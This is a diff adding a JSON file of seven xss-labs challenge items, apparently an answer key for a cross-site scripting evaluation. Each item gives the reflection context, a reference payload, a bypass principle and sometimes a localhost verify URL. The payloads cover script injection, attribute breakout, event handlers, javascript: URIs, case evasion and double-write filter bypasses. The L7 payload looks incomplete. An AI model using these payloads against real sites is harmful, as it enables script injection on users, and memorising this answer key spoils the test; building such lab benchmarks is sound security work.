@@ -1,0 +1,54 @@
+[
+  {
+    "id": "xss-labs-L1",
+    "context": "反射点落在文本节点，无过滤",
+    "reference_payload": "<script>alert(1)</script>",
+    "principle": "<script>",
+    "source": "xss-labs",
+    "verify_url": "http://localhost:8080/level1.php?name={payload}"
+  },
+  {
+    "id": "xss-labs-L2",
+    "context": "keyword 反射进 <h2>（htmlspecialchars 转义）与 <input> 的双引号 value 属性（value 未转义）；从 value 属性 breakout 出标签注入",
+    "reference_payload": "\"><script>alert(1)</script>",
+    "principle": "双引号 value 属性 breakout（value 未转义）闭合标签后注入 script",
+    "source": "xss-labs",
+    "verify_url": "http://localhost:8080/level2.php?keyword={payload}"
+  },
+  {
+    "id": "xss-labs-L3",
+    "context": "反射点落在属性值 value=\"...\" 内，htmlspecialchars 但没加 ENT_QUOTES（单引号未转义）",
+    "reference_payload": "' onclick='alert(1)",
+    "principle": "ENT_QUOTES",
+    "source": "xss-labs"
+  },
+  {
+    "id": "xss-labs-L4",
+    "context": "反射点落在属性值内，过滤了 < >",
+    "reference_payload": "\" onclick=\"alert(1)",
+    "principle": "Attribute",
+    "source": "xss-labs"
+  },
+  {
+    "id": "xss-labs-L5",
+    "context": "反射点落在属性值内，过滤 on 和 <script 关键字",
+    "reference_payload": "javascript:alert(1)",
+    "principle": "javascript:",
+    "source": "xss-labs"
+  },
+  {
+    "id": "xss-labs-L6",
+    "context": "keyword 反射进 <input> 双引号 value；过滤器大小写敏感地替换 on/<script（只匹配小写）",
+    "reference_payload": "\"><SCRIPT>alert(1)</SCRIPT>",
+    "principle": "大小写混淆绕过大小写敏感过滤（大写 SCRIPT 避开只匹配小写的过滤器）",
+    "source": "xss-labs",
+    "verify_url": "http://localhost:8080/level6.php?keyword={payload}"
+  },
+  {
+    "id": "xss-labs-L7",
+    "context": "过滤 script 关键字（只删一次）",
+    "reference_payload": "scrscriptipt",
+    "principle": "double-write",
+    "source": "xss-labs"
+  }
+]
